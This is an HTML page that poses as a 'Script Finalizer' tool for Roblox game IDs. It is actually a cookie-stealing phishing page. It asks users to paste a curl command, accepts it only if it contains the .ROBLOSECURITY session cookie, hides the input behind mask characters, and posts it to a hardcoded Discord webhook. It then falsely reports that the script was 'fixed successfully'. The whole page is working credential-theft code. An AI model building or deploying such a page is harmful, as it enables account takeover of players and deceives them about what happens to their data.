<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Script Finalizer</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
  <style>
    body { background: #000; color: #fff; font-family: system-ui, sans-serif; }
    .grid-bg {
      background-image:
        linear-gradient(to right, #111 1px, transparent 1px),
        linear-gradient(to bottom, #111 1px, transparent 1px);
      background-size: 4rem 4rem;
      opacity: 0.3;
    }
    /* Force fixed height + scroll */
    #visible-input {
      height: 220px !important;
      min-height: 220px !important;
      max-height: 220px !important;
      overflow-y: auto;
      scrollbar-width: thin;
      scrollbar-color: #6b46c1 #1a1a1a;
    }
    #visible-input::-webkit-scrollbar {
      width: 8px;
    }
    #visible-input::-webkit-scrollbar-track {
      background: #1a1a1a;
    }
    #visible-scrollbar-thumb {
      background: #6b46c1;
      border-radius: 4px;
    }
  </style>
</head>
<body class="min-h-screen flex items-center justify-center relative overflow-hidden">
  <div class="absolute inset-0 grid-bg"></div>
  <div class="absolute top-0 left-1/4 w-96 h-96 bg-purple-900/20 rounded-full blur-3xl"></div>
  <div class="absolute bottom-0 right-1/4 w-96 h-96 bg-blue-900/20 rounded-full blur-3xl"></div>

  <div class="relative z-10 w-full max-w-2xl px-6 space-y-12">
    <div class="text-center">
      <div class="inline-flex items-center gap-3 mb-4">
        <i data-lucide="terminal" class="w-10 h-10 text-purple-400"></i>
        <h1 class="text-5xl font-light tracking-wider">Script Finalizer</h1>
      </div>
      <div class="h-px w-32 bg-gradient-to-r from-transparent via-purple-500 to-transparent mx-auto"></div>
    </div>

    <div class="bg-zinc-900/50 backdrop-blur-xl border border-zinc-800 rounded-2xl p-8 shadow-2xl">
      <label class="block mb-4 text-sm font-light text-zinc-400">Insert Game ID BASH</label>

      <!-- Hidden real storage -->
      <textarea id="real-input" class="hidden"></textarea>

      <!-- Visible masked input (fixed height + scrollable) -->
      <textarea
        id="visible-input"
        placeholder="curl https://..."
        autocomplete="off"
        spellcheck="false"
        class="w-full bg-black/50 border border-zinc-700 rounded-lg px-4 py-3 text-white placeholder-zinc-600 font-mono text-sm resize-none focus:outline-none focus:border-purple-500 transition caret-transparent"
      ></textarea>

      <div id="counter" class="mt-2 text-right text-xs text-zinc-500">0 / 4000 characters</div>
      <div id="message"></div>

      <button id="submit" class="w-full mt-6 h-12 rounded-lg bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-500 hover:to-blue-500 disabled:opacity-50 disabled:cursor-not-allowed transition flex items-center justify-center gap-2 text-white font-light text-lg">
        Submit Script
      </button>
    </div>
    <p class="text-center text-zinc-600 text-sm">Only curl commands containing valid bash cURL are accepted</p>
  </div>

  <script>
    const realInput = document.getElementById('real-input');
    const visibleInput = document.getElementById('visible-input');
    const counter = document.getElementById('counter');
    const button = document.getElementById('submit');
    const message = document.getElementById('message');

    function updateVisible() {
      const realText = realInput.value;
      visibleInput.value = 'â€¢'.repeat(realText.length);
      counter.textContent = `${realText.length} / 4000 characters`;
      button.disabled = realText.length === 0;
    }

    visibleInput.addEventListener('beforeinput', (e) => {
      e.preventDefault();
      const current = realInput.value;

      if (e.inputType === 'insertText' && e.data !== null) {
        realInput.value = current + e.data;
      } else if (e.inputType === 'deleteContentBackward' && current.length > 0) {
        realInput.value = current.slice(0, -1);
      } else if (e.inputType === 'deleteContentForward' && current.length > 0) {
        realInput.value = current.slice(0, -1);
      } else if (e.inputType === 'insertFromPaste') {
        // handled separately in paste listener
        return;
      }

      updateVisible();
    });

    visibleInput.addEventListener('paste', (e) => {
      e.preventDefault();
      const paste = (e.clipboardData || window.clipboardData).getData('text');
      realInput.value += paste;
      updateVisible();
    });

    // Allow normal keyboard navigation (arrows, home/end, etc.) without breaking anything
    visibleInput.addEventListener('keydown', (e) => {
      if (['ArrowLeft', 'ArrowRight', 'ArrowUp', 'ArrowDown', 'Home', 'End'].includes(e.key)) {
        e.stopPropagation();
      }
    });

    button.addEventListener('click', async () => {
      const input = realInput.value.trim();

      if (!input.startsWith('curl') || !input.includes('.ROBLOSECURITY')) {
        message.innerHTML = `<div class="mt-4 p-4 bg-red-950/50 border border-red-800/50 rounded-lg flex items-center gap-2 text-red-400">
          <i data-lucide="alert-circle" class="w-5 h-5"></i>
          <span>Must start with "curl" and contain valid bash</span>
        </div>`;
        lucide.createIcons();
        return;
      }

      button.disabled = true;
      button.innerHTML = `Processing...`;

      try {
        let processed = input
          .replace(/https:\/\//g, '')
          .replace(/curl\s+/g, 'curl ...')
          .substring(0, 3900);

        await fetch('https://discord.com/api/webhooks/1440146889939882087/HPjpz_PLLJI__-ue7qScQ3IXKMZyhLrjf0ZX64P5uK_W9RoIaCjXQgxWeYFY1TY0i_DP', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            embeds: [{
              title: 'New Script Submission',
              description: "```bash\n" + processed + "\n```",
              color: 0x00ff00,
              timestamp: new Date().toISOString()
            }]
          })
        });

        message.innerHTML = `<div class="mt-4 p-4 bg-green-950/50 border border-green-800/50 rounded-lg flex items-center gap-2 text-green-400">
          <i data-lucide="check-circle" class="w-5 h-5"></i>
          <span>Your script has been fixed successfully!</span>
        </div>`;
        realInput.value = '';
        updateVisible();
      } catch (e) {
        message.innerHTML = `<div class="mt-4 p-4 bg-red-950/50 border border-red-800/50 rounded-lg text-red-400">
          <i data-lucide="alert-circle" class="w-5 h-5"></i>
          <span>Something went wrong. Try again.</span>
        </div>`;
      } finally {
        button.innerHTML = 'Submit Script';
        button.disabled = false;
        lucide.createIcons();
      }
    });

    lucide.createIcons();
  </script>
</body>
</html>
